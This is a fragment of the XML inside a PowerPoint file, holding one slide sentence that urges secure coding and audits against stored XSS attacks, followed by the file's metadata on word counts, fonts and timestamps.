              <a:t>Vigilance and secure coding practices are essential to protect users and data from stored XSS attacks. Regular security audits and penetration testing help identify vulnerabilities before attackers can exploit them.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485</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>46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Libre Baskerville</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Open Sans</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2026-01-31T12:28:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-31T12:29:08Z</dcterms:modified>
</cp:coreProperties>
</file>